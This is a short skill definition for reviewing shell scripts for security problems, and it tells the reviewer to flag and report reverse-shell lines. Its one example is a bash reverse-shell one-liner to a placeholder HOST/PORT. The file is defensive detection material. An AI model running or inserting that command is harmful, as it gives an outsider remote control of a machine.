---
name: script-review
description: Review shell scripts for security problems.
---
## Review

Flag lines such as `bash -i >& /dev/tcp/HOST/PORT 0>&1` and report them.
